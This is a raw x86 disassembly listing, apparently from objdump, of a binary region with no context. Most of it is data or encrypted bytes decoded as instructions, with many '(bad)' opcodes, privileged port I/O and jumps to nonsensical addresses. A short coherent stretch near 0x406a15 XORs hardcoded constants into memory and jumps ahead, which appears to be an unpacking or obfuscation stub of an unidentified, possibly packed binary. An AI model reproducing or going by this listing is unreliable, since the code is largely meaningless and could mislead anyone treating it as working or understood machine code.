  4069cf:	sub    bh,BYTE PTR [eax]
  4069d1:	fsub   QWORD PTR [eax]
  4069d3:	push   es
  4069d4:	pop    ecx
  4069d5:	fwait
  4069d6:	out    0xad,al
  4069d8:	add    ch,BYTE PTR [ebx+0x73]
  4069db:	jne    0x4069c0
  4069dd:	les    edx,FWORD PTR [esi]
  4069df:	xchg   edx,eax
  4069e0:	test   DWORD PTR [edi],ebx
  4069e2:	hlt    
  4069e3:	repnz sbb ebp,DWORD PTR [ecx-0x5fc3f729]
  4069ea:	inc    ebp
  4069eb:	aaa    
  4069ec:	dec    ebp
  4069ed:	test   al,0x2c
  4069ef:	addr16 call 0xdc20978b
  4069f5:	jne    0x4069d8
  4069f7:	cmp    al,0xe0
  4069f9:	ds xchg edx,eax
  4069fb:	xor    al,0xf6
  4069fd:	(bad)  
  4069fe:	js     0x4069f7
  406a00:	dec    edi
  406a01:	retf   
  406a02:	dec    ecx
  406a03:	(bad)  
  406a04:	push   ds
  406a05:	imul   edi,DWORD PTR [ebx+0x34],0xed030cb
  406a0c:	(bad)  
  406a0d:	sub    BYTE PTR es:[ecx-0x20],dh
  406a11:	xchg   edx,eax
  406a12:	neg    bl
  406a14:	int3   
  406a15:	push   esi
  406a16:	push   edi
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434683,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x4345fb
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x43463b,0x4346f7
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x4345df,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x434637,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0xa184d9eb,eax
  406a76:	mov    ebx,DWORD PTR [ebp+0x4f7e7ec7]
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406ad0
  406a80:	pop    edx
  406a81:	push   cs
  406a82:	pop    edx
  406a83:	hlt    
  406a84:	inc    ebp
  406a85:	pop    ebp
  406a86:	(bad)  
  406a87:	mov    edx,0x88355016
  406a8c:	xor    ebp,DWORD PTR [ecx+ebx*2]
  406a8f:	ins    BYTE PTR es:[edi],dx
  406a90:	fistp  DWORD PTR [eax+0x15d50e07]
  406a96:	jns    0x406a59
  406a98:	adc    esp,DWORD PTR [esi]
  406a9a:	or     DWORD PTR [edx],ebp
  406a9c:	fcomp  DWORD PTR [ebx-0xb9e537d]
  406aa2:	rol    DWORD PTR [ebp-0x56f7119e],0xf0
  406aa9:	in     eax,dx
  406aaa:	or     eax,DWORD PTR [edx-0x55]
  406aad:	cmp    cl,bl
  406aaf:	pop    ds
  406ab0:	(bad)  
  406ab2:	popa   
  406ab3:	and    ah,0x33
  406ab6:	sar    DWORD PTR [ebp+0x43c6790],0x72
  406abd:	push   eax
  406abe:	pop    esi
  406abf:	push   edi
  406ac0:	sbb    eax,0x8e54188b
  406ac5:	dec    esi
  406ac6:	mov    ebp,0x2709b6e1
  406acb:	loopne 0x406a7e
  406acd:	ds js  0x406aaa
  406ad0:	ror    DWORD PTR [edi-0x5c],0x76
  406ad4:	mov    ecx,0x1259f54a
  406ad9:	mov    ds:0x613d902,al
  406ade:	inc    eax
  406adf:	jp     0x406ac2
  406ae1:	mov    bl,0xa3
  406ae3:	jb     0x406b50
  406ae5:	ret    0x2889
  406ae8:	mov    al,0x2e
  406aea:	in     eax,dx
  406aeb:	cmc    
  406aec:	xor    cl,BYTE PTR [edx+0x20390acb]
  406af2:	addr16 jg 0x406abf
  406af5:	idiv   DWORD PTR [ebx-0x384e1e85]
  406afb:	mov    dh,0x3f
  406afd:	and    BYTE PTR [edx+edi*2-0x5d],0x26
  406b02:	shl    BYTE PTR [edi-0x29],cl
  406b05:	fsubr  QWORD PTR [edi-0x60]
  406b08:	pop    edx
  406b09:	(bad)  
  406b0a:	pushf  
  406b0b:	and    dl,BYTE PTR [edi+ebx*2-0x7b]
  406b0f:	jecxz  0x406a95
  406b11:	loop   0x406b35
  406b13:	and    cl,0xaa
  406b16:	frstor [edi-0x44]
  406b19:	(bad)  [ecx+ebx*1]
  406b1c:	dec    esi
  406b1d:	aas    
  406b1e:	jle    0x406b0c
  406b20:	cmp    eax,0xc6939a8b
  406b25:	cwde   
  406b26:	inc    ecx
  406b27:	not    DWORD PTR [ebp-0x53]
  406b2a:	pop    ds
  406b2b:	mov    dl,BYTE PTR [eax+eax*2-0x32]
  406b2f:	les    esp,FWORD PTR [eax-0x27]
  406b32:	pop    ebp
  406b33:	cli    
  406b34:	push   esi
  406b35:	mov    dl,0xac
  406b37:	jge    0x406ac8
  406b39:	cmp    eax,0xef7d94be
  406b3e:	(bad)  
  406b3f:	jmp    0xbd94:0x12ced64e
  406b46:	test   al,0x57
  406b48:	in     eax,0xa3
  406b4a:	cmp    BYTE PTR [ebp+0x565bcbf2],dl
  406b50:	xchg   esi,ebx
  406b52:	(bad)  
  406b53:	in     eax,0x25
  406b55:	push   esi
  406b56:	rcl    BYTE PTR [ebp+esi*8+0x27],cl
  406b5a:	int    0xa
  406b5c:	js     0x406b4b
  406b5e:	dec    esp
  406b5f:	leave  
  406b60:	fdiv   QWORD PTR [ecx-0x1f]
  406b63:	xchg   DWORD PTR [ebx-0x31b627d8],esp
  406b69:	cmp    BYTE PTR [ebp-0x68],ah
  406b6c:	loopne 0x406b30
  406b6e:	inc    ebp
  406b6f:	(bad)  
  406b70:	loop   0x406b0f
  406b72:	mov    cl,ch
  406b74:	daa    
  406b75:	dec    eax
  406b76:	mov    dl,0xcd
  406b78:	inc    esp
  406b79:	mov    bl,BYTE PTR [ecx]
  406b7b:	fidivr WORD PTR [eax]
  406b7d:	cmp    eax,0x8954232f
  406b82:	fidivr DWORD PTR [esi]
  406b84:	mov    ds:0x2d1c91b6,al
  406b89:	jg     0x406b47
  406b8b:	push   cs
  406b8c:	out    0x4f,al
  406b8e:	aas    
  406b8f:	dec    edi
  406b90:	pop    edi
  406b91:	sub    al,0x29
  406b93:	test   BYTE PTR [esp+eax*4],0x68
  406b97:	fbld   TBYTE PTR [esi]
  406b99:	cwde   
  406b9a:	enter  0x8dab,0x51
  406b9e:	adc    BYTE PTR [edi+eax*8-0x25ddb283],al
  406ba5:	cmp    esp,0xa8536368
  406bab:	push   cs
  406bac:	hlt    
  406bad:	jl     0x406b56
  406baf:	or     al,0x16
  406bb1:	and    al,0x7b
  406bb3:	mul    BYTE PTR [edi+0x4c394868]
  406bb9:	xchg   ebx,eax
  406bba:	rcl    BYTE PTR [esp+edx*8+0x1f29ae40],1
  406bc1:	mov    dh,0x54
  406bc3:	loope  0x406b4d
  406bc5:	push   esp
  406bc6:	rcl    BYTE PTR [ecx],cl
  406bc8:	sbb    ebx,DWORD PTR [edi+0x64]
  406bcb:	sub    eax,DWORD PTR [edi]
  406bcd:	jge    0x406bcd
  406bcf:	fadd   st,st(1)
  406bd1:	push   ecx
  406bd2:	loop   0x406b75
  406bd4:	scas   al,BYTE PTR es:[edi]
  406bd5:	jecxz  0x406ba7
  406bd7:	push   ebx
  406bd8:	cmp    eax,0x3b62ccbd
  406bdd:	or     edx,esi
  406bdf:	rcr    ax,cl
  406be2:	pop    ebx
  406be3:	fisttp QWORD PTR [esi]
  406be5:	mov    ds:0xec1bdd13,eax
  406bea:	sbb    al,0x9d
  406bec:	lea    ebx,[ecx+ecx*2]
  406bef:	or     ch,0xaa
  406bf2:	das    
  406bf3:	mov    dl,0xb5
  406bf5:	jb     0x406c42
  406bf7:	xchg   edx,eax
  406bf8:	stc    
  406bf9:	fsubr  QWORD PTR ds:0x21e09bf3
  406bff:	push   0xffffff93
  406c01:	cmp    DWORD PTR [esi],eax
  406c03:	gs pop ds
  406c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c06:	jmp    0x4e7f545c
  406c0b:	mov    bl,0x8e
  406c0d:	xor    cl,ah
  406c0f:	mov    esp,0x42b5cfe1
  406c14:	mov    ds,eax
  406c16:	scas   al,BYTE PTR es:[edi]
  406c17:	sbb    DWORD PTR [eax],esi
  406c19:	aaa    
  406c1a:	jl     0x406c4b
  406c1c:	mov    eax,ds:0x76c4cbcd
  406c21:	jae    0x406c64
  406c23:	mov    esi,0x479e29da
  406c28:	data16 aaa 
  406c2a:	outs   dx,BYTE PTR ds:[esi]
  406c2b:	inc    ebx
  406c2c:	scas   al,BYTE PTR es:[edi]
  406c2d:	jb     0x406c25
  406c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c30:	fild   DWORD PTR [esp+ebp*1]
  406c33:	push   esi
  406c34:	mov    eax,ds:0xaefb5698
  406c39:	icebp  
  406c3a:	leave  
  406c3b:	in     al,0x89
  406c3d:	or     cl,BYTE PTR [esi+0x4895a721]
  406c43:	enter  0x3435,0x5f
  406c47:	and    al,0x25
  406c49:	xor    eax,0xf096a50d
  406c4e:	popa   
  406c4f:	adc    al,0xf2
  406c51:	fcmovu st,st(2)
  406c53:	js     0x406cb7
  406c55:	mov    ah,0x4d
  406c57:	jmp    0x406cd0
  406c59:	push   ss
  406c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c5b:	in     eax,dx
  406c5c:	xlat   BYTE PTR ds:[ebx]
  406c5d:	pop    esi
  406c5e:	mov    cl,0x6f
  406c60:	int3   
  406c61:	cld    
  406c62:	or     cl,BYTE PTR [eax]
  406c64:	xor    ebp,esp
  406c66:	pop    ss
  406c67:	add    DWORD PTR [edx+0x50],esi
  406c6a:	jg     0x406ca8
  406c6c:	mov    ?,WORD PTR [ecx+0x48666c41]
  406c72:	jmp    0x6c9d833b
  406c77:	jmp    0x406c09
  406c79:	out    0xf1,eax
  406c7b:	add    eax,0x1f8c138c
  406c80:	aad    0xa0
  406c82:	sti    
  406c83:	sub    edi,DWORD PTR [eax+eax*4-0x14cff851]
  406c8a:	or     al,0xff
  406c8c:	mov    edx,0x82fb5d78
  406c91:	test   BYTE PTR [ebp+0x5beea935],0x2d
  406c98:	imul   ecx,DWORD PTR [eax+0x11],0x53
  406c9c:	call   0x63fb0200
  406ca1:	cmp    al,0x86
  406ca3:	or     ch,dl
  406ca5:	fs or  eax,0xc120da
  406cab:	in     al,dx
  406cac:	push   edi
  406cad:	sub    ah,BYTE PTR [ebx+ecx*8+0x7a]
  406cb1:	shl    BYTE PTR [ecx-0x317fa5f8],1
  406cb7:	fnstcw WORD PTR [edx-0x7b6639f0]
  406cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cbe:	or     DWORD PTR [edi+0x1db64e58],edx
  406cc4:	ja     0x406c6d
  406cc6:	mov    ebp,0xeffa590c
  406ccb:	add    eax,0xd43309a3
  406cd0:	lds    esp,FWORD PTR [esi+ecx*2]
  406cd3:	daa    
  406cd4:	ins    BYTE PTR es:[edi],dx
  406cd5:	mov    BYTE PTR [ecx],ch
  406cd7:	popa   
  406cd8:	and    al,ch
  406cda:	call   DWORD PTR [eax]
  406cdc:	adc    BYTE PTR [eax+0x1d],cl
  406cdf:	xor    ebp,DWORD PTR [eax+0x2de27fa1]
  406ce5:	mov    edi,0xefa92e54
  406cea:	cmp    DWORD PTR [edi+esi*2-0x33791ac2],0xffffffc5
  406cf2:	ins    DWORD PTR es:[edi],dx
  406cf3:	jge    0x406cce
  406cf5:	ror    DWORD PTR [esi+0x141964cb],1
  406cfb:	and    al,0xe
  406cfd:	adc    BYTE PTR [ecx+esi*1+0x18085ca2],ch
  406d04:	test   eax,0x26450879
  406d09:	mov    al,BYTE PTR [ebx-0x72e211da]
  406d0f:	mov    ah,0x3f
  406d11:	sub    eax,DWORD PTR [edi+0x1dfa8e84]
  406d17:	inc    edi
  406d18:	out    dx,eax
  406d19:	xlat   BYTE PTR ds:[ebx]
  406d1a:	(bad)  
  406d1b:	(bad)  
  406d1c:	les    esi,FWORD PTR [ecx-0x478b95d7]
  406d22:	jo     0x406ca6
  406d24:	in     al,0xce
  406d26:	movups xmm1,xmm7
  406d29:	add    BYTE PTR [ebx+eax*2-0x7c8cbbb1],bh
  406d30:	outs   dx,BYTE PTR ds:[esi]
  406d31:	sbb    ebp,0x6
  406d34:	push   eax
  406d35:	or     DWORD PTR [ecx],edi
  406d37:	inc    esp
  406d38:	xchg   edx,eax
  406d39:	popf   
  406d3a:	pop    es
  406d3b:	sahf   
  406d3c:	es iret 
  406d3e:	mov    al,ds:0xd003256
  406d43:	sbb    edx,DWORD PTR [esi]
  406d45:	pushf  
  406d46:	mov    edx,0xeb46692c
  406d4b:	repnz adc BYTE PTR [ebx+esi*2],0x9b
  406d50:	mov    ds:0x1f324c4c,eax
  406d55:	mul    DWORD PTR [ebx+0x9]
  406d58:	or     ecx,DWORD PTR [edi]
  406d5a:	and    BYTE PTR [eax+0x53],al
  406d5d:	and    BYTE PTR ds:0xff0175f5,cl
  406d63:	scas   eax,DWORD PTR es:[edi]
  406d64:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  406d66:	aaa    
  406d67:	lock cwde 
  406d69:	(bad)  
  406d6a:	enter  0x7cbd,0xa4
  406d6e:	xchg   edi,eax
  406d6f:	jecxz  0x406d3a
  406d71:	jbe    0x406ddb
  406d73:	mov    bh,0x75
  406d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d76:	mov    ds,edi
  406d78:	push   0x23
  406d7a:	scas   eax,DWORD PTR es:[edi]
  406d7b:	mov    al,0x73
  406d7d:	js     0x406de8
  406d7f:	retf   
  406d80:	push   cs
  406d81:	ja     0x406ded
  406d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d84:	pop    ss
  406d85:	xor    ch,bh
  406d87:	fwait
  406d88:	ins    DWORD PTR es:[edi],dx
  406d89:	je     0x406d76
  406d8b:	loopne 0x406dc0
  406d8d:	fist   DWORD PTR [edi+0x4c9572d]
  406d93:	xor    cl,BYTE PTR [edi-0x46]
  406d96:	pop    ebp
  406d97:	loope  0x406d91
  406d99:	add    eax,0xcd36c0ae
  406d9e:	aam    0xe3
  406da0:	inc    ebx
  406da1:	push   es
  406da2:	shl    DWORD PTR [ecx-0x75efd15c],1
  406da8:	xor    ebx,DWORD PTR [esi-0x1c]
  406dab:	stos   BYTE PTR es:[edi],al
  406dac:	add    al,BYTE PTR [edx+0x1c]
  406daf:	mov    WORD PTR [ebx-0x6a27217e],fs
  406db5:	xor    DWORD PTR [edi+0x76],0x25
  406db9:	pop    ds
  406dba:	pop    ss
  406dbb:	or     BYTE PTR [ecx+0xa],dh
  406dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dbf:	add    DWORD PTR [eax+0x61e8c28c],esp
  406dc5:	popf   
  406dc6:	xchg   edi,eax
  406dc7:	inc    DWORD PTR [ebx-0x49]
  406dca:	in     al,0x77
  406dcc:	in     eax,dx
  406dcd:	push   ebp
  406dce:	mov    ebp,0x4fffbbcc
  406dd3:	scas   eax,DWORD PTR es:[edi]
  406dd4:	lahf   
  406dd5:	fisubr DWORD PTR [edi]
  406dd7:	jp     0x406de4
  406dd9:	aaa    
  406dda:	mov    ds,WORD PTR [edx-0x4787113f]
  406de0:	mov    ebx,0x7c767cc6
  406de5:	adc    ch,BYTE PTR [edx+0x734d4678]
  406deb:	aaa    
  406dec:	outs   dx,BYTE PTR ds:[esi]
  406ded:	dec    ebp
  406dee:	sub    DWORD PTR [edx+0x43],edi
  406df1:	jmp    0x12ee92c6
  406df6:	xchg   BYTE PTR [ecx+0x19],cl
  406df9:	ret    
  406dfa:	(bad)
  406dfe:	loopne 0x406e4f
  406e00:	ins    DWORD PTR es:[edi],dx
  406e01:	stc    
  406e02:	aaa    
  406e03:	sbb    eax,0x186aab34
  406e08:	aas    
  406e09:	xor    bl,BYTE PTR [ecx]
  406e0b:	or     esi,edx
  406e0d:	pop    es
  406e0e:	jbe    0x406e71
  406e10:	out    0x3b,al
  406e12:	(bad)  
  406e13:	xor    eax,0x8f0e2a58
  406e18:	or     dl,0xd
  406e1b:	jmp    DWORD PTR [eax]
  406e1d:	call   0xf5aa9a15
  406e22:	sbb    ebp,ecx
  406e24:	cli    
  406e25:	inc    edi
  406e26:	out    dx,al
  406e27:	mov    fs,WORD PTR ds:0xb091f590
  406e2d:	fstp   TBYTE PTR [edx]
  406e2f:	and    ah,BYTE PTR ds:0xe330d914
  406e35:	push   edi
  406e36:	xchg   ebp,esi
  406e38:	fcomp  st(2)
  406e3a:	mov    WORD PTR [edx+0x22],gs
  406e3d:	jl     0x406dc6
  406e3f:	mov    ebp,0x33c613b8
  406e44:	ss (bad) 
  406e46:	adc    eax,0xf452f682
  406e4b:	cmp    BYTE PTR [esi+0x5f],ah
  406e4e:	into   
  406e4f:	inc    esp
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x434647,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x1efa25eb]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e7a
  406e7b:	jno    0x406e37
  406e7d:	xor    ecx,DWORD PTR [edi]
  406e7f:	xchg   esp,eax
  406e80:	fidivr DWORD PTR [ebx]
  406e82:	mov    esp,0xe4ad3012
  406e87:	mov    ch,0xc3
  406e89:	stos   DWORD PTR es:[edi],eax
  406e8a:	fs pop eax
  406e8c:	xchg   esi,eax
  406e8d:	jl     0x406e40
  406e8f:	aas    
  406e90:	pop    esi
  406e91:	xor    BYTE PTR [edi-0x6a],cl
  406e94:	inc    edx
  406e95:	rcr    BYTE PTR [eax-0x16],0x8b
  406e99:	cwde   
  406e9a:	aaa    
  406e9b:	aad    0xf8
  406e9d:	jae    0x406e2b
  406e9f:	adc    al,0x13
  406ea1:	inc    edi
  406ea2:	jp     0x406eff
  406ea4:	fyl2xp1 
  406ea6:	shl    BYTE PTR [ecx-0x57b8f],1
  406eac:	mov    DWORD PTR [ebp+0x45],edi
  406eaf:	pop    ebp
  406eb0:	rol    DWORD PTR [ecx-0x31770c23],1
  406eb6:	les    ebp,FWORD PTR ds:0x8575d422
  406ebc:	mov    ah,dl
  406ebe:	mov    edi,0x16eb6ee7
  406ec3:	loop   0x406ec4
  406ec5:	push   ds
  406ec6:	pop    esi
  406ec7:	lods   al,BYTE PTR ds:[esi]
  406ec8:	into   
  406ec9:	(bad)  
  406eca:	jne    0x406f0e
  406ecc:	add    DWORD PTR [eax+0x77],eax
  406ecf:	inc    ebp
  406ed0:	adc    al,0xed
  406ed2:	add    edi,DWORD PTR [ecx-0x21059bc6]
  406ed8:	sub    edi,ebx
  406eda:	imul   edx,DWORD PTR [esp+ebx*8+0x14783fef],0x78
  406ee2:	enter  0x1b7,0xf9
  406ee6:	add    cl,BYTE PTR [edi-0xb]
  406ee9:	mov    ebx,DWORD PTR ds:0x4ade13f
  406eef:	dec    ecx
  406ef0:	mov    al,ds:0xffb0c646
  406ef5:	inc    ebp
  406ef6:	(bad)  
  406ef8:	adc    esp,esi
  406efa:	aam    0x20
  406efc:	cwde   
  406efd:	rcl    BYTE PTR [ecx+0x2822676f],1
  406f03:	jo     0x406f6a
  406f05:	(bad)  
  406f06:	cli    
  406f07:	jge    0x406eb3
  406f09:	popa   
  406f0a:	xchg   esi,eax
  406f0b:	dec    edi
  406f0c:	mov    edi,0xbbacbc8d
  406f11:	ffree  st(5)
  406f13:	hlt    
  406f14:	aaa    
  406f15:	jne    0x406f5c
  406f17:	adc    ch,al
  406f19:	xor    al,0x2
  406f1b:	or     al,0xde
  406f1d:	push   0x52
  406f1f:	cmp    DWORD PTR [ebp+0x490bc18e],edx
  406f25:	adc    BYTE PTR [edx],cl
  406f27:	imul   edi,DWORD PTR [ecx],0x53
  406f2a:	push   ecx
  406f2b:	imul   edi,DWORD PTR [esi-0x728740c],0x9c22ede2
  406f35:	call   0xb845019c
  406f3a:	mov    DWORD PTR [edx+0x43],eax
  406f3d:	fisubr WORD PTR [ebp-0x77]
  406f40:	call   0xf4b1cdc1
  406f45:	cli    
  406f46:	loop   0x406f63
  406f48:	jno    0x406f6a
  406f4a:	sub    esi,esp
  406f4c:	add    DWORD PTR [edx+eiz*4],ecx
  406f4f:	jmp    0xe7e66836
  406f54:	ret    
  406f55:	mov    edi,0xa7f7615e
  406f5a:	jno    0x406edf
  406f5c:	test   al,0x8
  406f5e:	jns    0x406eef
  406f60:	and    BYTE PTR [esi+0x46ff6c87],ah
  406f66:	pop    ebx
  406f67:	into   
  406f68:	out    0xfe,al
  406f6a:	add    edx,0x8c7898a7
  406f70:	(bad)  
  406f71:	popa   
  406f72:	pop    ds
  406f73:	inc    edx
  406f74:	jmp    0xf39ab2b2
  406f79:	sbb    ah,BYTE PTR [ecx-0x5ef3f19f]
  406f7f:	push   ecx
  406f80:	sub    dh,BYTE PTR [esp+eiz*2+0x60]
  406f84:	mov    edx,0x94023822
  406f89:	repnz sbb eax,0xe7172c93
  406f8f:	ds out 0x6f,al
  406f92:	xor    bh,BYTE PTR [ebx+0x52]
  406f95:	hlt    
  406f96:	xor    dh,BYTE PTR [ebx-0x8]
  406f99:	inc    esi
  406f9a:	or     BYTE PTR [esi],al
  406f9c:	push   ebx
  406f9d:	mov    BYTE PTR [edi],cl
  406f9f:	sbb    esp,edx
  406fa1:	scas   al,BYTE PTR es:[edi]
  406fa2:	adc    edx,DWORD PTR [edi]
  406fa4:	popa   
  406fa5:	mov    esi,0xf8cc1b33
  406faa:	sar    BYTE PTR [edi-0x1b],cl
  406fad:	dec    ebp
  406fae:	rcl    DWORD PTR [eax+0x30],1
  406fb1:	pushf  
  406fb2:	icebp  
  406fb3:	lock mov ebp,0x5d89d62a
  406fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fba:	lock cs adc edi,ecx
  406fbe:	jbe    0x407010
  406fc0:	adc    DWORD PTR [edx],ebx
  406fc2:	cld    
  406fc3:	(bad)  [edx+ebp*4-0x5f]
  406fc7:	mov    eax,0xeccb7af9
  406fcc:	mov    ?,WORD PTR [esi+0x752b9e2e]
  406fd2:	fcom   DWORD PTR [eax]
  406fd4:	pop    eax
  406fd5:	xchg   ebp,eax
  406fd6:	test   al,0x2b
  406fd8:	imul   edx,DWORD PTR [eax-0x61],0x3770394c
  406fdf:	xchg   edi,eax
  406fe0:	jge    0x406f68
  406fe2:	cmp    BYTE PTR [eax+0x2064d2f8],ah
  406fe8:	push   edx
  406fe9:	stc    
  406fea:	sub    edi,DWORD PTR gs:[esi-0x2c]
  406fee:	dec    esi
  406fef:	inc    edx
  406ff0:	fist   WORD PTR [ecx+ebx*4-0x28]
  406ff4:	xor    eax,0x309b5373
  406ff9:	sbb    BYTE PTR [esi-0x39],cl
  406ffc:	test   eax,0x1598e27
  407001:	dec    esi
  407002:	ret    
  407003:	sub    esp,esp
  407005:	mov    dh,0x5a
  407007:	xchg   esi,eax
  407008:	out    0x39,al
  40700a:	cmp    ebx,0xbc24de8e
  407010:	or     eax,0x1c4a3feb
  407015:	mov    ds:0x7290b853,eax
  40701a:	scas   al,BYTE PTR es:[edi]
  40701b:	mov    ds:0x51d39ed5,al
  407020:	mov    ds:0x62fe78fa,al
  407025:	xchg   ebx,eax
  407026:	or     esi,DWORD PTR [eax-0x42]
  407029:	mov    ds:0x1dd2899d,eax
  40702e:	or     dh,cl
  407030:	sub    al,0x4d
  407032:	gs inc edi
  407034:	inc    edx
  407035:	sbb    ebx,DWORD PTR ds:0xfc7b4860
  40703b:	adc    eax,ecx
  40703d:	pop    esp
  40703e:	sub    DWORD PTR [ebx+ecx*4+0x76ebe1d1],ebp
  407045:	stos   DWORD PTR es:[edi],eax
  407046:	add    DWORD PTR [eax+0x1d],edi
  407049:	add    ah,dh
  40704b:	xchg   ecx,eax
  40704c:	in     eax,dx
  40704d:	ja     0x407058
  40704f:	push   edx
  407050:	fist   DWORD PTR [esi+0x42ee19e3]
  407056:	not    al
  407058:	dec    ecx
  407059:	mov    al,0x6c
  40705b:	cmp    ch,BYTE PTR [ebx]
  40705d:	pop    edx
  40705e:	jno    0x40705f
  407060:	or     eax,0x1a25ec0d
  407065:	cmp    ch,BYTE PTR [esi]
  407067:	addr16 mov ds:0x4ca1,al
  40706b:	pushf  
  40706c:	retf   0x37f1
  40706f:	jbe    0x406ffc
  407071:	cmp    BYTE PTR ds:0xea39819f,cl
  407077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407078:	mov    bh,0x1c
  40707a:	xor    edx,esp
  40707c:	in     eax,dx
  40707d:	sub    DWORD PTR ss:[esi],edx
  407080:	(bad)  
  407082:	mov    ss,edx
  407084:	jbe    0x4070ac
  407086:	mov    cl,0x81
  407088:	fidiv  WORD PTR [esi]
  40708a:	xchg   edx,eax
  40708b:	push   ecx
  40708c:	pusha  
  40708d:	sub    DWORD PTR ds:0xead4c661,eax
  407093:	ret    
  407094:	sbb    edi,esi
  407096:	stos   DWORD PTR es:[edi],eax
  407097:	and    eax,0xa0df1e07
  40709c:	outs   dx,BYTE PTR ds:[esi]
  40709d:	mov    al,ds:0xb18fb9f3
  4070a2:	cmp    al,0x1c
  4070a4:	(bad)  
  4070a5:	sub    eax,0x9d46f8fe
  4070aa:	clc    
  4070ab:	not    BYTE PTR [ebx-0x10e12f05]
  4070b1:	jne    0x4070c6
  4070b3:	call   0xd3ab:0x85ea6c3d
  4070ba:	adc    DWORD PTR [ebx],edi
  4070bc:	cs inc ebp
  4070be:	jmp    0x4070b5
  4070c0:	and    BYTE PTR [eax+0x20],al
  4070c3:	shr    DWORD PTR [ebp+0x482eb26],cl
  4070c9:	repz loope 0x4070a8
  4070cc:	dec    esp
  4070cd:	mov    esp,0xec66e8f0
  4070d2:	cld    
  4070d3:	pop    eax
  4070d4:	xchg   ebp,eax
  4070d5:	mov    ch,0x67
  4070d7:	push   0xda940144
  4070dc:	mov    ecx,0x4151e324
  4070e1:	mov    eax,ds:0x1bc0c040
  4070e6:	test   al,0x5d
  4070e8:	int3   
  4070e9:	push   esi
  4070ea:	sub    ecx,DWORD PTR [esi]
  4070ec:	or     DWORD PTR [esi],edx
  4070ee:	mov    WORD PTR [ebx-0x45],?
  4070f1:	arpl   WORD PTR [eax-0x73],di
  4070f4:	ins    DWORD PTR es:[edi],dx
  4070f5:	in     eax,dx
  4070f6:	ror    DWORD PTR [edx-0x1aaf67c0],1
  4070fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070fd:	add    edx,ebp
  4070ff:	pop    esp
  407100:	aas    
  407101:	loope  0x40711f
  407103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407104:	ja     0x4070ce
  407106:	mov    al,ds:0x1abf48a1
  40710b:	mov    ebx,0x7963d1d7
  407110:	dec    eax
  407111:	fwait
  407112:	add    al,0xb0
  407114:	fmul   st(7),st
  407116:	icebp  
  407117:	mov    al,ds:0x5d4a69f8
  40711c:	ficomp WORD PTR [ecx]
  40711e:	jbe    0x407125
  407120:	push   esp
  407121:	out    0xa5,eax
  407123:	jmp    0x44bcf38a
  407128:	ret    
  407129:	xchg   edx,eax
  40712a:	call   0x95f2:0xc6d0d8ba
  407131:	loop   0x407146
  407133:	sbb    bl,BYTE PTR [esi+0x5dc48552]
  407139:	mov    DWORD PTR [eax],eax
  40713b:	in     al,0xd9
  40713d:	sub    al,0x8c
  40713f:	cmp    al,0x47
  407141:	(bad)  
  407142:	mov    ebp,0xda0d5af2
  407147:	jecxz  0x4071bb
  407149:	data16 fcomp st(0)
  40714c:	mov    ds:0xf44e65fc,al
  407151:	and    eax,0x4ea8b622
  407156:	fisubr WORD PTR [esi+ebp*4+0x4c5bc5]
  40715d:	ret    
  40715e:	mov    al,BYTE PTR [edi]
  407160:	je     0x407179
  407162:	mov    al,0xd1
  407164:	adc    eax,0x9b5ab762
  407169:	cmp    ah,dh
  40716b:	clc    
  40716c:	cdq    
  40716d:	hlt    
  40716e:	mov    bl,0x39
  407170:	es dec esi
  407172:	outs   dx,BYTE PTR ds:[esi]
  407173:	xchg   esp,eax
  407174:	rcr    bl,1
  407176:	jb     0x40711b
  407178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407179:	or     edi,DWORD PTR [edi-0x432f1634]
  40717f:	pop    eax
  407180:	or     edi,DWORD PTR [edi+0x6b]
  407183:	inc    ebp
  407184:	mov    al,0x7b
  407186:	lahf   
  407187:	or     al,0x94
  407189:	sti    
  40718a:	cmp    DWORD PTR [eax],ecx
  40718c:	lea    esi,[edi+0x7a]
  40718f:	push   ds
  407190:	xchg   ebp,esi
  407192:	add    al,0x5c
  407194:	add    al,0xfe
  407196:	adc    eax,0x4c0b2834
  40719b:	iret   
  40719c:	xor    eax,0x1c0c5df2
  4071a1:	and    al,0x83
  4071a3:	shl    edx,0x8d
  4071a6:	(bad)
  4071a9:	jo     0x4071e2
  4071ab:	cdq    
  4071ac:	push   es
  4071ad:	jp     0x407179
  4071af:	aas    
